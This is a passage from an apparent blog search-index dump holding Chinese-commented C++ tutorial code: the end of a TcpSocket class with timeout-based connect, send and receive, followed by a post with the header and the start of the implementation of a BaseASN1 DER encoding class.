inet_addr(ip); ret = connectTimeout((struct sockaddr_in*) (&amp;servaddr), (unsigned int)timeout); if (ret &lt; 0) &#123; if (ret == -1 &amp;&amp; errno == ETIMEDOUT) &#123; ret = TimeoutError; return ret; &#125; else &#123; //printf(\"func connect_timeout() err: %d\\n\", ret); &#125; &#125; return ret;&#125;int TcpSocket::sendMsg(char * sendData, int dataLen, int timeout)&#123; int ret = 0; if (sendData == NULL || dataLen &lt;= 0) &#123; ret = ParamError; return ret; &#125; ret = writeTimeout(timeout); if (ret == 0) &#123; int writed = 0; unsigned char *netdata = (unsigned char *)malloc(dataLen + 4); if (netdata == NULL) &#123; ret = MallocError; printf(\"func sckClient_send() mlloc Err:%d\\n \", ret); return ret; &#125; int netlen = htonl(dataLen); memcpy(netdata, &amp;netlen, 4); memcpy(netdata + 4, sendData, dataLen); writed = writen(netdata, dataLen + 4); if (writed &lt; (dataLen + 4)) &#123; if (netdata != NULL) &#123; free(netdata); netdata = NULL; &#125; return writed; &#125; if (netdata != NULL) //wangbaoming 20150630 modify bug &#123; free(netdata); netdata = NULL; &#125; &#125; if (ret &lt; 0) &#123; //失败返回-1，超时返回-1并且errno = ETIMEDOUT if (ret == -1 &amp;&amp; errno == ETIMEDOUT) &#123; ret = TimeoutError; printf(\"func sckClient_send() mlloc Err:%d\\n \", ret); return ret; &#125; return ret; &#125; return ret;&#125;int TcpSocket::recvMsg(char ** recvData, int &amp; recvLen, int timeout)&#123; int ret = 0; if (recvData == NULL || recvLen == NULL) &#123; ret = ParamError; printf(\"func sckClient_rev() timeout , err:%d \\n\", TimeoutError); return ret; &#125; ret = readTimeout(timeout); //bugs modify bombing if (ret != 0) &#123; if (ret == -1 || errno == ETIMEDOUT) &#123; ret = TimeoutError; return ret; &#125; else &#123; return ret; &#125; &#125; int netdatalen = 0; ret = readn(&amp;netdatalen, 4); //读包头 4个字节 if (ret == -1) &#123; //printf(\"func readn() err:%d \\n\", ret); return ret; &#125; else if (ret &lt; 4) &#123; ret = PeerCloseError; //printf(\"func readn() err peer closed:%d \\n\", ret); return ret; &#125; int n; n = ntohl(netdatalen); char* tmpBuf = (char *)malloc(n + 1); if (tmpBuf == NULL) &#123; ret = MallocError; return ret; &#125; ret = readn(tmpBuf, n); //根据长度读数据 if (ret == -1) &#123; //printf(\"func readn() err:%d \\n\", ret); return ret; &#125; else if (ret &lt; n) &#123; ret = PeerCloseError; //printf(\"func readn() err peer closed:%d \\n\", ret); return ret; &#125; *recvData = tmpBuf; recvLen = n; tmpBuf[n] = '\\0'; //多分配一个字节内容，兼容可见字符串 字符串的真实长度仍然为n return 0;&#125;void TcpSocket::disConnect()&#123; if (m_socket &gt;= 0) &#123; close(m_socket); &#125;&#125;void TcpSocket::freeMemory(char ** buf)&#123; if (*buf != NULL) &#123; free(*buf); *buf = NULL; &#125;&#125;/////////////////////////////////////////////////////// 子函数 ////////////////////////////////////////////////////////** blockIO - 设置I/O为非阻塞模式* @fd: 文件描符符*/int TcpSocket::blockIO(int fd)&#123; int ret = 0; int flags = fcntl(fd, F_GETFL); if (flags == -1) &#123; ret = flags; return ret; &#125; flags |= O_NONBLOCK; ret = fcntl(fd, F_SETFL, flags); if (ret == -1) &#123; return ret; &#125; return ret;&#125;/** noBlockIO - 设置I/O为阻塞模式* @fd: 文件描符符*/int TcpSocket::noBlockIO(int fd)&#123; int ret = 0; int flags = fcntl(fd, F_GETFL); if (flags == -1) &#123; ret = flags; return ret; &#125; flags &amp;= ~O_NONBLOCK; ret = fcntl(fd, F_SETFL, flags); if (ret == -1) &#123; return ret; &#125; return ret;&#125;/** readTimeout - 读超时检测函数，不含读操作* @wait_seconds: 等待超时秒数，如果为0表示不检测超时* 成功（未超时）返回0，失败返回-1，超时返回-1并且errno = ETIMEDOUT*/int TcpSocket::readTimeout(unsigned int wait_seconds)&#123; int ret = 0; if (wait_seconds &gt; 0) &#123; fd_set read_fdset; struct timeval timeout; FD_ZERO(&amp;read_fdset); FD_SET(m_socket, &amp;read_fdset); timeout.tv_sec = wait_seconds; timeout.tv_usec = 0; //select返回值三态 //1 若timeout时间到（超时），没有检测到读事件 ret返回=0 //2 若ret返回&lt;0 &amp;&amp; errno == EINTR 说明select的过程中被别的信号中断（可中断睡眠原理） //2-1 若返回-1，select出错 //3 若ret返回值&gt;0 表示有read事件发生，返回事件发生的个数 do &#123; ret = select(m_socket + 1, &amp;read_fdset, NULL, NULL, &amp;timeout); &#125; while (ret &lt; 0 &amp;&amp; errno == EINTR); if (ret == 0) &#123; ret = -1; errno = ETIMEDOUT; &#125; else if (ret == 1) ret = 0; &#125; return ret;&#125;/** writeTimeout - 写超时检测函数，不含写操作* @wait_seconds: 等待超时秒数，如果为0表示不检测超时* 成功（未超时）返回0，失败返回-1，超时返回-1并且errno = ETIMEDOUT*/int TcpSocket::writeTimeout(unsigned int wait_seconds)&#123; int ret = 0; if (wait_seconds &gt; 0) &#123; fd_set write_fdset; struct timeval timeout; FD_ZERO(&amp;write_fdset); FD_SET(m_socket, &amp;write_fdset); timeout.tv_sec = wait_seconds; timeout.tv_usec = 0; do &#123; ret = select(m_socket + 1, NULL, &amp;write_fdset, NULL, &amp;timeout); &#125; while (ret &lt; 0 &amp;&amp; errno == EINTR); if (ret == 0) &#123; ret = -1; errno = ETIMEDOUT; &#125; else if (ret == 1) ret = 0; &#125; return ret;&#125;/** connectTimeout - connect* @addr: 要连接的对方地址* @wait_seconds: 等待超时秒数，如果为0表示正常模式* 成功（未超时）返回0，失败返回-1，超时返回-1并且errno = ETIMEDOUT*/int TcpSocket::connectTimeout(sockaddr_in *addr, unsigned int wait_seconds)&#123; int ret; socklen_t addrlen = sizeof(struct sockaddr_in); if (wait_seconds &gt; 0) blockIO(m_socket); ret = connect(m_socket, (struct sockaddr*)addr, addrlen); if (ret &lt; 0 &amp;&amp; errno == EINPROGRESS) &#123; //printf(\"11111111111111111111\\n\"); fd_set connect_fdset; struct timeval timeout; FD_ZERO(&amp;connect_fdset); FD_SET(m_socket, &amp;connect_fdset); timeout.tv_sec = wait_seconds; timeout.tv_usec = 0; do &#123; // 一但连接建立，则套接字就可写 所以connect_fdset放在了写集合中 ret = select(m_socket + 1, NULL, &amp;connect_fdset, NULL, &amp;timeout); &#125; while (ret &lt; 0 &amp;&amp; errno == EINTR); if (ret == 0) &#123; ret = -1; errno = ETIMEDOUT; &#125; else if (ret &lt; 0) return -1; else if (ret == 1) &#123; //printf(\"22222222222222222\\n\"); /* ret返回为1（表示套接字可写），可能有两种情况，一种是连接建立成功，一种是套接字产生错误，*/ /* 此时错误信息不会保存至errno变量中，因此，需要调用getsockopt来获取。 */ int err; socklen_t socklen = sizeof(err); int sockoptret = getsockopt(m_socket, SOL_SOCKET, SO_ERROR, &amp;err, &amp;socklen); if (sockoptret == -1) &#123; return -1; &#125; if (err == 0) &#123; //printf(\"3333333333333\\n\"); ret = 0; &#125; else &#123; //printf(\"4444444444444444:%d\\n\", err); errno = err; ret = -1; &#125; &#125; &#125; if (wait_seconds &gt; 0) &#123; noBlockIO(m_socket); &#125; return ret;&#125;/** readn - 读取固定字节数* @fd: 文件描述符* @buf: 接收缓冲区* @count: 要读取的字节数* 成功返回count，失败返回-1，读到EOF返回&lt;count*/int TcpSocket::readn(void *buf, int count)&#123; size_t nleft = count; ssize_t nread; char *bufp = (char*)buf; while (nleft &gt; 0) &#123; if ((nread = read(m_socket, bufp, nleft)) &lt; 0) &#123; if (errno == EINTR) continue; return -1; &#125; else if (nread == 0) return count - nleft; bufp += nread; nleft -= nread; &#125; return count;&#125;/** writen - 发送固定字节数* @buf: 发送缓冲区* @count: 要读取的字节数* 成功返回count，失败返回-1*/int TcpSocket::writen(const void *buf, int count)&#123; size_t nleft = count; ssize_t nwritten; char *bufp = (char*)buf; while (nleft &gt; 0) &#123; if ((nwritten = write(m_socket, bufp, nleft)) &lt; 0) &#123; if (errno == EINTR) continue; return -1; &#125; else if (nwritten == 0) continue; bufp += nwritten; nleft -= nwritten; &#125; return count;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"封装ASN1类、工厂模式和单向散列函数","slug":"封装ASN1类-工厂模式和单向散列函数","date":"2022-05-22T18:01:12.000Z","updated":"2022-05-22T20:46:29.897Z","comments":true,"path":"2022/05/23/封装ASN1类-工厂模式和单向散列函数/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/05/23/封装ASN1类-工厂模式和单向散列函数/","excerpt":"","text":"下载地址: https://gitee.com/xiaochenyan/mypro/tree/master/多端安全协议传输平台/工厂类和hash BaseASN1类是ASN1中的API进行封装 BaseASN1.h 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300#ifndef BASEASN1_H#define BASEASN1_H#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include \"ItcastLog.h\"// #define ITCASTDER_NoErr 0// 自定义基础数据类型typedef int ITCAST_INT;typedef unsigned char ITCAST_UINT8;typedef unsigned short ITCAST_UINT16;typedef unsigned long ITCAST_UINT32;typedef signed long ITCAST_SINT32;typedef unsigned char ITASN1_BOOLEAN;// 数据节点结构体(类)typedef struct ITCAST_ANYBUF_&#123; ITCAST_UINT8 *pData; ITCAST_UINT32 dataLen; ITCAST_UINT32 unusedBits; /* for bit string */ ITCAST_UINT32 memoryType; ITCAST_UINT32 dataType; struct ITCAST_ANYBUF_ *next; /* for sequence and set */ struct ITCAST_ANYBUF_ *prev;&#125;ITCAST_ANYBUF;// 自定义复合数据类型typedef ITCAST_ANYBUF ITASN1_INTEGER;typedef ITCAST_ANYBUF ITASN1_OCTETSTRING;typedef ITCAST_ANYBUF ITASN1_BITSTRING;typedef ITCAST_ANYBUF ITASN1_PRINTABLESTRING;/*begin of bmpstring*/typedef ITCAST_ANYBUF ITASN1_BMPSTRING;/*end of bmpstring*/typedef ITCAST_ANYBUF ITASN1_ENUMERATED;typedef ITCAST_ANYBUF ITASN1_IA5STRING;typedef ITCAST_ANYBUF ITASN1_SEQUENCE;typedef ITCAST_ANYBUF ITASN1_SET;class BaseASN1&#123;public: // 标记内存类型 enum MemoryType&#123;StaticMemory=1, MallocMemory=2&#125;; // 错误描述 enum DerErrType&#123; NoErr=0, MemoryErr=200, LengthErr, LengthNotEqual, DataRangeErr, InvalidTag &#125;; // 整形数的每一位代表不同的数据类型0-31, 即: tag的值对应的数据类型 enum DerTag&#123; ITCAST_DER_ID_RESERVED, ITCAST_DER_ID_BOOLEAN, ITCAST_DER_ID_INTEGER, ITCAST_DER_ID_BITSTRING, ITCAST_DER_ID_OCTETSTRING, ITCAST_DER_ID_NULL, ITCAST_DER_ID_OBJECT_IDENTIFIER, ITCAST_DER_ID_OBJECT_DESCRIPTOR, ITCAST_DER_ID_EXTERNAL, ITCAST_DER_ID_REAL, ITCAST_DER_ID_ENUMERATED, ITCAST_DER_ID_EMBEDDED_PDV, ITCAST_DER_ID_STRING_UTF8, ITCAST_DER_ID_13, ITCAST_DER_ID_14, ITCAST_DER_ID_15, ITCAST_DER_ID_SEQUENCE, ITCAST_DER_ID_SET, ITCAST_DER_ID_STRING_NUMERIC, ITCAST_DER_ID_STRING_PRINTABLE, ITCAST_DER_ID_STRING_T61, ITCAST_DER_ID_STRING_VIDEOTEX, ITCAST_DER_ID_STRING_IA5, ITCAST_DER_ID_TIME_UTC, ITCAST_DER_ID_TIME_GENERALIZED, ITCAST_DER_ID_STRING_GRAPHIC, ITCAST_DER_ID_STRING_ISO646, ITCAST_DER_ID_STRING_GENERAL, ITCAST_DER_ID_STRING_UNIVERSAL, ITCAST_DER_ID_29, ITCAST_DER_ID_STRING_BMP &#125;; // 构造函数 BaseASN1(); //DER编码整数数据 ITCAST_INT DER_ItAsn1_WriteInteger(ITCAST_UINT32 integer, ITASN1_INTEGER **ppDerInteger); //DER解码整数数据 ITCAST_INT DER_ItAsn1_ReadInteger(ITASN1_INTEGER *pDerInteger, ITCAST_UINT32 *pInteger); //DER编码BitString类型数据 ITCAST_INT DER_ItAsn1_WriteBitString(ITASN1_BITSTRING *pBitString, ITASN1_BITSTRING **ppDerBitString); //DER解码BitString类型数据 ITCAST_INT DER_ItAsn1_ReadBitString(ITASN1_BITSTRING *pDerBitString, ITASN1_BITSTRING **ppBitString); //DER编码CharString类型数据 ITCAST_INT DER_ItAsn1_WritePrintableString(ITASN1_PRINTABLESTRING *pPrintString, ITASN1_PRINTABLESTRING **ppDerPrintString); //DER解码PrintableString类型数据 ITCAST_INT DER_ItAsn1_ReadPrintableString(ITASN1_PRINTABLESTRING *pDerPrintString, ITASN1_PRINTABLESTRING **ppPrintString); ITCAST_INT DER_ItAsn1_WriteSequence(ITASN1_SEQUENCE *pSequence, ITCAST_ANYBUF **ppDerSequence); ITCAST_INT DER_ItAsn1_ReadSequence(ITCAST_ANYBUF *pDerSequence, ITASN1_SEQUENCE **ppSequence); ITCAST_INT DER_ItAsn1_WriteNull(ITCAST_ANYBUF ** ppDerNull); ITCAST_INT DER_ItAsn1_ReadNull(ITCAST_ANYBUF * ppDerNull, ITCAST_UINT8 * pInt); // 释放一个序列(链表), pAnyBuf为链表的头结点 ITCAST_INT DER_ITCAST_FreeQueue(ITCAST_ANYBUF *pAnyBuf); // 创建ITCAST_ANYBUF, 将strOrigin写入创建的ITCAST_ANYBUF内存中, 通过pOriginBuf将内存地址传出 ITCAST_INT DER_ITCAST_String_To_AnyBuf(ITCAST_ANYBUF **pOriginBuf, unsigned char * strOrigin, int strOriginLen); int WriteNullSequence(ITCAST_ANYBUF **pOutData); // 同 EncodeChar 函数 int EncodeUnsignedChar(unsigned char *pData, int dataLen, ITCAST_ANYBUF **outBuf); int DecodeUnsignedChar(ITCAST_ANYBUF *inBuf, unsigned char **Data, int *pDataLen); // pData编码为ITCAST_ANYBUF(有malloc动作), 将新的ITCAST_ANYBUF节点地址赋值给outBuf int EncodeChar(char *pData, int dataLen, ITCAST_ANYBUF **outBuf); // 解析节点inBuf中的字符串数据, 通过第二个参数Data指针传出 int DecodeChar(ITCAST_ANYBUF *inBuf, char **Data, int *pDataLen);private: ITCAST_INT DER_ItAsn1_Low_GetTagInfo( ITCAST_UINT8 **ppDerData, ITCAST_UINT32 **ppTagValue, ITCAST_UINT32 **ppTagSize); ITCAST_UINT32 DER_ItAsn1_Low_Count_LengthOfSize(ITCAST_UINT32 iLength); ITCAST_INT DER_ItAsn1_GetLengthInfo( ITCAST_ANYBUF *pDerData, int *pLengthValue, int *pLengthSize); ITCAST_INT DER_ItAsn1_Low_GetLengthInfo( ITCAST_UINT8 **ppDerData, ITCAST_UINT32 **ppLengthValue, ITCAST_UINT32 **ppLengthSize); ITCAST_INT DER_ItAsn1_Low_IntToChar( ITCAST_UINT32 integer, ITCAST_UINT8 **ppData, ITCAST_UINT32 **ppLength); ITCAST_INT DER_ItAsn1_Low_CharToInt( ITCAST_UINT8 *aData, ITCAST_UINT32 lLength, ITCAST_UINT32 **ppInteger); ITCAST_INT DER_ItAsn1_Low_WriteTagAndLength( ITCAST_ANYBUF *pAnyIn, ITCAST_UINT8 cTag, ITCAST_ANYBUF **ppAnyOut, ITCAST_UINT8 **ppUint8Value); ITCAST_INT DER_ItAsn1_Low_ReadTagAndLength( ITCAST_ANYBUF *pAnyIn, ITCAST_UINT8 **ppUint8Data, ITCAST_ANYBUF **ppAnyOut, ITCAST_UINT8 **ppUint8Value); ITCAST_INT DER_ItAsn1_WriteCharString( ITCAST_ANYBUF *pCharString, ITCAST_ANYBUF **ppDerCharString); ITCAST_INT DER_ItAsn1_ReadCharString( ITCAST_ANYBUF *pDerCharString, ITCAST_ANYBUF **ppCharString); ITCAST_INT DER_ItAsn1_WriteBmpString( ITASN1_BMPSTRING *pBmpString, ITASN1_BMPSTRING **ppDerBmpString); ITCAST_INT DER_ItAsn1_ReadBmpString( ITASN1_BMPSTRING *pDerBmpString, ITASN1_BMPSTRING **ppBmpString); void DER_DI_FreeAnybuf(ITCAST_ANYBUF * pAnyBuf); // 给一个ITCAST_ANYBUF类型空节点指针分配存储空间 int DER_CREATE_LOW_ITCAST_ANYBUF(ITCAST_ANYBUF *&amp;point); // 内联函数 inline void DER_ITCAST_Free(void *memblock) &#123; if(memblock) &#123; free(memblock); memblock = NULL; &#125; &#125; // 计算数据类型对应的tag inline ITCAST_UINT32 DER_ITASN1_LOW_IDENTIFIER(ITCAST_UINT8 &amp;cTag) &#123; return cTag &amp; ITCAST_DER_SHORT_ID_MASK; &#125; // 在堆上创建一个指定大小的数组, 使用指针的引用 == 使用指针的指针 inline int DER_ITASN1_LOW_CREATEUINT8(ITCAST_UINT8* &amp;point, ITCAST_UINT32 size) &#123; point = (ITCAST_UINT8*)malloc(size); if (point==NULL) &#123; return 7002; &#125; //memset(point,0,size) return 0; &#125; // 在堆上创建一个 ITCAST_UINT32 大小的内存 // 原来的宏参数是指针, 所以此次应该使用指针的引用 inline int DER_ITASN1_LOW_CREATEUINT32(ITCAST_UINT32* &amp;point) &#123; point = (ITCAST_UINT32*)malloc(sizeof(ITCAST_UINT32)); if (point==NULL) return 7002; memset(point, 0, sizeof(ITCAST_UINT32)); return 0; &#125; // 通过检测iResult的值, 返回错误类型 inline DerErrType DER_ITASN1_LOW_CHECKERR(ITCAST_INT iResult, DerErrType iErrNumber) &#123; if (iResult == iErrNumber) return iErrNumber; return NoErr; &#125; // 释放节点内存 inline void DER_DACERT_LOW_FREE_ANYBUF(ITCAST_ANYBUF *point) &#123; DER_ITCAST_Free(point-&gt;pData); DER_ITCAST_Free(point); &#125;private: ItcastLog m_log; // log类 const ITCAST_UINT8 TRUE = 1; const ITCAST_UINT8 FALSE = 0; /* 标记当前数据是原始数据还是编码数据 */ const ITCAST_UINT32 ITCAST_DER_CONSTRUCTED = 0x20; const ITCAST_UINT32 ITCAST_DER_PRIMITIVE = 0x00; /* The encodings for the universal types */ const ITCAST_UINT32 ITCAST_DER_UNIVERSAL = 0x00; const ITCAST_UINT32 ITCAST_DER_APPLICATION = 0x40; const ITCAST_UINT32 ITCAST_DER_CONTEXT_SPECIFIC = 0x80; const ITCAST_UINT32 ITCAST_DER_PRIVATE = 0xC0; const ITCAST_UINT32 ITCAST_DER_RESERVED = (ITCAST_DER_UNIVERSAL | ITCAST_DER_PRIMITIVE | ITCAST_DER_ID_RESERVED); const ITCAST_UINT32 ITCAST_DER_BOOLEAN = (ITCAST_DER_UNIVERSAL | ITCAST_DER_PRIMITIVE | ITCAST_DER_ID_BOOLEAN); const ITCAST_UINT32 ITCAST_DER_INTEGER = (ITCAST_DER_UNIVERSAL | ITCAST_DER_PRIMITIVE | ITCAST_DER_ID_INTEGER); const ITCAST_UINT32 ITCAST_DER_BITSTRING = (ITCAST_DER_UNIVERSAL | ITCAST_DER_PRIMITIVE | ITCAST_DER_ID_BITSTRING); const ITCAST_UINT32 ITCAST_DER_OCTETSTRING = (ITCAST_DER_UNIVERSAL | ITCAST_DER_PRIMITIVE | ITCAST_DER_ID_OCTETSTRING); const ITCAST_UINT32 ITCAST_DER_NULL = (ITCAST_DER_UNIVERSAL | ITCAST_DER_PRIMITIVE | ITCAST_DER_ID_NULL); const ITCAST_UINT32 ITCAST_DER_OBJECT_IDENTIFIER = (ITCAST_DER_UNIVERSAL | ITCAST_DER_PRIMITIVE | ITCAST_DER_ID_OBJECT_IDENTIFIER); const ITCAST_UINT32 ITCAST_DER_OBJECT_DESCRIPTOR = (ITCAST_DER_UNIVERSAL | ITCAST_DER_PRIMITIVE | ITCAST_DER_ID_OBJECT_DESCRIPTOR); const ITCAST_UINT32 ITCAST_DER_EXTERNAL = (ITCAST_DER_UNIVERSAL | ITCAST_DER_PRIMITIVE | ITCAST_DER_ID_EXTERNAL); const ITCAST_UINT32 ITCAST_DER_REAL = (ITCAST_DER_UNIVERSAL | ITCAST_DER_PRIMITIVE | ITCAST_DER_ID_REAL); const ITCAST_UINT32 ITCAST_DER_ENUMERATED = (ITCAST_DER_UNIVERSAL | ITCAST_DER_PRIMITIVE | ITCAST_DER_ID_ENUMERATED); const ITCAST_UINT32 ITCAST_DER_EMBEDDED_PDV = (ITCAST_DER_UNIVERSAL | ITCAST_DER_PRIMITIVE | ITCAST_DER_ID_EMBEDDED_PDV); const ITCAST_UINT32 ITCAST_DER_STRING_UTF8 = (ITCAST_DER_UNIVERSAL | ITCAST_DER_PRIMITIVE | ITCAST_DER_ID_STRING_UTF8); const ITCAST_UINT32 ITCAST_DER_13 = (ITCAST_DER_UNIVERSAL | ITCAST_DER_PRIMITIVE | ITCAST_DER_ID_13); const ITCAST_UINT32 ITCAST_DER_14 = (ITCAST_DER_UNIVERSAL | ITCAST_DER_PRIMITIVE | ITCAST_DER_ID_14); const ITCAST_UINT32 ITCAST_DER_15 = (ITCAST_DER_UNIVERSAL | ITCAST_DER_PRIMITIVE | ITCAST_DER_ID_15); const ITCAST_UINT32 ITCAST_DER_SEQUENCE = (ITCAST_DER_UNIVERSAL | ITCAST_DER_CONSTRUCTED | ITCAST_DER_ID_SEQUENCE); const ITCAST_UINT32 ITCAST_DER_SET = (ITCAST_DER_UNIVERSAL | ITCAST_DER_CONSTRUCTED | ITCAST_DER_ID_SET); const ITCAST_UINT32 ITCAST_DER_STRING_NUMERIC = (ITCAST_DER_UNIVERSAL | ITCAST_DER_PRIMITIVE | ITCAST_DER_ID_STRING_NUMERIC); const ITCAST_UINT32 ITCAST_DER_STRING_PRINTABLE = (ITCAST_DER_UNIVERSAL | ITCAST_DER_PRIMITIVE | ITCAST_DER_ID_STRING_PRINTABLE); const ITCAST_UINT32 ITCAST_DER_STRING_T61 = (ITCAST_DER_UNIVERSAL | ITCAST_DER_PRIMITIVE | ITCAST_DER_ID_STRING_T61); const ITCAST_UINT32 ITCAST_DER_STRING_VIDEOTEX = (ITCAST_DER_UNIVERSAL | ITCAST_DER_PRIMITIVE | ITCAST_DER_ID_STRING_VIDEOTEX); const ITCAST_UINT32 ITCAST_DER_STRING_IA5 = (ITCAST_DER_UNIVERSAL | ITCAST_DER_PRIMITIVE | ITCAST_DER_ID_STRING_IA5); const ITCAST_UINT32 ITCAST_DER_TIME_UTC = (ITCAST_DER_UNIVERSAL | ITCAST_DER_PRIMITIVE | ITCAST_DER_ID_TIME_UTC); const ITCAST_UINT32 ITCAST_DER_TIME_GENERALIZED = (ITCAST_DER_UNIVERSAL | ITCAST_DER_PRIMITIVE | ITCAST_DER_ID_TIME_GENERALIZED); const ITCAST_UINT32 ITCAST_DER_STRING_GRAPHIC = (ITCAST_DER_UNIVERSAL | ITCAST_DER_PRIMITIVE | ITCAST_DER_ID_STRING_GRAPHIC); const ITCAST_UINT32 ITCAST_DER_STRING_ISO646 = (ITCAST_DER_UNIVERSAL | ITCAST_DER_PRIMITIVE | ITCAST_DER_ID_STRING_ISO646); const ITCAST_UINT32 ITCAST_DER_STRING_GENERAL = (ITCAST_DER_UNIVERSAL | ITCAST_DER_PRIMITIVE | ITCAST_DER_ID_STRING_GENERAL); const ITCAST_UINT32 ITCAST_DER_STRING_UNIVERSAL = (ITCAST_DER_UNIVERSAL | ITCAST_DER_PRIMITIVE | ITCAST_DER_ID_STRING_UNIVERSAL); const ITCAST_UINT32 ITCAST_DER_29 = (ITCAST_DER_UNIVERSAL | ITCAST_DER_PRIMITIVE | ITCAST_DER_ID_29); const ITCAST_UINT32 ITCAST_DER_STRING_BMP = (ITCAST_DER_UNIVERSAL | ITCAST_DER_PRIMITIVE | ITCAST_DER_ID_STRING_BMP); /* Masks to extract information from a tag number */ const ITCAST_UINT32 ITCAST_DER_CLASS_MASK = 0xC0; const ITCAST_UINT32 ITCAST_DER_CONSTRUCTED_MASK = 0x20; const ITCAST_UINT32 ITCAST_DER_SHORT_ID_MASK = 0x1F; const ITCAST_UINT32 ITCAST_DER_FIRST_NOT_ID_MASK = 0x7F; //xia const ITCAST_UINT32 ITCAST_DER_FIRST_YES_ID_MASK = 0x80; //xia const ITCAST_UINT32 ITCAST_DER_ALL_YES_ID_MASK = 0xFF; //xia /* The maximum size for the short tag number encoding, and the magic value which indicates that a long encoding of the number is being used */ const ITCAST_UINT32 ITASN1_MAX_SHORT_BER_ID = 30; const ITCAST_UINT32 ITASN1_LONG_BER_ID = 0x1F;&#125;;#endif // BASEASN1_H BaseASN1.cpp 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131141151161171181191201211221231241251261271281291301311321331341351361371381391401411421431441451461471481491501511521531541551561571581591601611621631641651661671681691701711721731741751761771781791801811821831841851861871881891901911921931941951961971981992002012022032042052062072082092102112122132142152162172182192202212222232242252262272282292302312322332342352362372382392402412422432442452462472482492502512522532542552562572582592602612622632642652662672682692702712722732742752762772782792802812822832842852862872882892902912922932942952962972982993003013023033043053063073083093103113123133143153163173183193203213223233243253263273283293303313323333343353363373383393403413423433443453463473483493503513523533543553563573583593603613623633643653663673683693703713723733743753763773783793803813823833843853863873883893903913923933943953963973983994004014024034044054064074084094104114124134144154164174184194204214224234244254264274284294304314324334344354364374384394404414424434444454464474484494504514524534544554564574584594604614624634644654664674684694704714724734744754764774784794804814824834844854864874884894904914924934944954964974984995005015025035045055065075085095105115125135145155165175185195205215225235245255265275285295305315325335345355365375385395405415425435445455465475485495505515525535545555565575585595605615625635645655665675685695705715725735745755765775785795805815825835845855865875885895905915925935945955965975985996006016026036046056066076086096106116126136146156166176186196206216226236246256266276286296306316326336346356366376386396406416426436446456466476486496506516526536546556566576586596606616626636646656666676686696706716726736746756766776786796806816826836846856866876886896906916926936946956966976986997007017027037047057067077087097107117127137147157167177187197207217227237247257267277287297307317327337347357367377387397407417427437447457467477487497507517527537547557567577587597607617627637647657667677687697707717727737747757767777787797807817827837847857867877887897907917927937947957967977987998008018028038048058068078088098108118128138148158168178188198208218228238248258268278288298308318328338348358368378388398408418428438448458468478488498508518528538548558568578588598608618628638648658668678688698708718728738748758768778788798808818828838848858868878888898908918928938948958968978988999009019029039049059069079089099109119129139149159169179189199209219229239249259269279289299309319329339349359369379389399409419429439449459469479489499509519529539549559569579589599609619629639649659669679689699709719729739749759769779789799809819829839849859869879889899909919929939949959969979989991000100110021003100410051006100710081009101010111012101310141015101610171018101910201021102210231024102510261027102810291030103110321033103410351036103710381039104010411042104310441045104610471048104910501051105210531054105510561057105810591060106110621063106410651066106710681069107010711072107310741075107610771078107910801081108210831084108510861087108810891090109110921093109410951096109710981099110011011102110311041105110611071108110911101111111211131114111511161117111811191120112111221123112411251126112711281129113011311132113311341135113611371138113911401141114211431144114511461147114811491150115111521153115411551156115711581159116011611162116311641165116611671168116911701171117211731174117511761177117811791180118111821183118411851186118711881189119011911192119311941195119611971198119912001201120212031204120512061207120812091210121112121213121412151216121712181219122012211222122312241225122612271228122912301231123212331234123512361237123812391240124112421243124412451246124712481249125012511252125312541255125612571258125912601261126212631264126512661267126812691270127112721273127412751276127712781279128012811282128312841285128612871288128912901291129212931294129512961297129812991300130113021303130413051306130713081309131013111312131313141315131613171318131913201321132213231324132513261327132813291330133113321333133413351336133713381339134013411342134313441345134613471348134913501351135213531354135513561357135813591360136113621363136413651366136713681369137013711372137313741375#include \"BaseASN1.h\"#include &lt;iostream&gt;#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;using namespace std;BaseASN1::BaseASN1()&#123;&#125;// 不知道干什么的一个宏, 尼玛...#define OIDDEF(tag, oidValue) &#123;tag, &#123;oidValue,sizeof(oidValue),0,1,0,0,0&#125; &#125;ITCAST_INT BaseASN1::DER_ItAsn1_Low_GetTagInfo(ITCAST_UINT8 **ppDerData, ITCAST_UINT32 **ppTagValue, ITCAST_UINT32 **ppTagSize)&#123; ITCAST_UINT8 *pMidData = NULL; ITCAST_UINT32 *pMidValue = NULL; ITCAST_UINT32 *pMidSize = NULL; //初始化 pMidValue = (ITCAST_UINT32*)malloc(sizeof(ITCAST_UINT32)); // pMidValue = new ITCAST_UINT32; if (pMidValue == NULL) &#123; m_log.Log(__FILE__, __LINE__, ItcastLog::ERROR, MemoryErr, \"func DER_ItAsn1_Low_GetTagInfo() err\"); return MemoryErr; &#125; pMidSize = (ITCAST_UINT32*)malloc(sizeof(ITCAST_UINT32)); // pMidSize = new ITCAST_UINT32; if (pMidSize == NULL) &#123; if (pMidValue) &#123; free(pMidValue); pMidValue = NULL; &#125; m_log.Log(__FILE__, __LINE__, ItcastLog::ERROR, MemoryErr, \"func DER_ItAsn1_Low_GetTagInfo() err\"); return MemoryErr; &#125; *pMidSize = 0; *pMidValue = 0; pMidData = *ppDerData; //读Tag if ((*pMidData &amp; ITCAST_DER_SHORT_ID_MASK) != ITCAST_DER_SHORT_ID_MASK) &#123; if (*pMidData &amp; ITCAST_DER_CONTEXT_SPECIFIC) *pMidValue = *(pMidData++); else *pMidValue = *(pMidData++) &amp; ITCAST_DER_SHORT_ID_MASK; (*pMidSize)++; &#125; else &#123; do &#123; *pMidValue = *pMidValue | (*(++pMidData) &amp; ITCAST_DER_FIRST_NOT_ID_MASK); *pMidValue &lt;&lt;= 8; (*pMidSize)++; &#125; while (!(*pMidData &amp; ITCAST_DER_FIRST_YES_ID_MASK)); *pMidValue |= 